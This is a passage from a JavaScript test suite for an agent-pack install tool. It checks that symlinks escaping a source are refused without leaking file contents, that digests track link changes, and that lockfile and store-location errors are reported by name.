  assert.match(codeOf(() => fetchAt(root, { pack: { dir: self } })).message, /assets\/up is a symlink that points outside the source/);
}));

test("a link that stays inside the source is kept, installs offline, and the digest covers what it resolves to", () => withDir((root) => {
  const pack = repoOf(root, "pack", PACK);
  const roleDir = join(pack.dir, "assets", "roles", "code-agent");
  execFileSync("ln", ["-s", "prompt.md", join(roleDir, "prompt-alias.md")]);
  g(pack.dir, "add", "-A");
  g(pack.dir, "commit", "-q", "-m", "link in");
  const sha = g(pack.dir, "rev-parse", "HEAD");
  fetchAt(root, { pack: { git: pack.url, ref: "trunk" } });
  const stored = join(root, "store", `pack@${sha}`);
  assert.equal(execFileSync("readlink", [join(stored, "assets", "roles", "code-agent", "prompt-alias.md")], { encoding: "utf8" }).trim(), "prompt.md");
  const home = join(root, "home");
  mkdirSync(join(home, ".claude"), { recursive: true });
  const r = vbcdx(["install", "agent", "code-agent", "--harness=claude", `--lock=${join(root, "vbcdx.lock.json")}`], { home, env: offlineEnv(root) });
  assert.equal(r.status, 0, r.stderr);
  // Tamper: the in-tree link is repointed out of the tree. The install refuses it by name.
  const alias = join(stored, "assets", "roles", "code-agent", "prompt-alias.md");
  rmSync(alias);
  writeFileSync(join(root, "outside.txt"), "SECRET\n");
  execFileSync("ln", ["-s", join(root, "outside.txt"), alias]);
  const r2 = vbcdx(["install", "agent", "code-agent", "--harness=claude", `--lock=${join(root, "vbcdx.lock.json")}`, "--force"], { home, env: offlineEnv(root) });
  assert.equal(r2.status, EXIT.CONFIG);
  assert.match(r2.stderr, /source "pack": assets\/roles\/code-agent\/prompt-alias\.md is a symlink that points outside the source/);
  assert.equal((r2.stdout + r2.stderr).includes("SECRET"), false);
}));

test("repointing an in-tree link at another in-tree file changes the digest", () => withDir((root) => {
  const dir = join(root, "t");
  mkdirSync(join(dir, "d"), { recursive: true });
  writeFileSync(join(dir, "a"), "a\n");
  writeFileSync(join(dir, "d", "a"), "b\n");
  execFileSync("ln", ["-s", "a", join(dir, "l")]);
  const before = treeDigest(dir);
  rmSync(join(dir, "l"));
  execFileSync("ln", ["-s", "d/a", join(dir, "l")]);
  assert.notEqual(treeDigest(dir), before);
}));

// ── a committed node_modules, and a store inside a dir source ──────────────

test("a tool that commits node_modules still needs its lockfile", () => withDir((root) => {
  const tool = join(root, "tool");
  cpSync(TOOL, tool, { recursive: true });
  const pkg = JSON.parse(read(join(tool, "package.json")));
  pkg.dependencies = { "example-dep": "1.0.0" };
  writeFileSync(join(tool, "package.json"), JSON.stringify(pkg));
  mkdirSync(join(tool, "node_modules", "example-dep"), { recursive: true });
  writeFileSync(join(tool, "node_modules", "example-dep", "package.json"), JSON.stringify({ name: "example-dep", version: "1.0.0" }));
  assert.match(codeOf(() => fetchAt(root, { tool: { dir: tool } })).message, /^Source tool has dependencies but no package-lock\.json/);
}));

test("a dir source that contains the store is a named error, not a recursion", () => withDir((root) => {
  const src = join(root, "src");
  cpSync(PACK, src, { recursive: true });
  const sourcesPath = join(src, "vbcdx.sources.json");
  writeFileSync(sourcesPath, JSON.stringify({ schema_version: 1, sources: { here: { dir: "." } } }));
  const r = codeOf(() => fetchSources({ sourcesPath, lockPath: join(src, "vbcdx.lock.json"), storeDir: join(src, "vbcdx-store") }));
  assert.equal(r.code, EXIT.CONFIG);
  assert.match(r.message, /^Source here: .* contains the store .*vbcdx-store; put the store outside the source \(--store\)\.$/);
  assert.equal(existsSync(join(src, "vbcdx.lock.json")), false);
}));
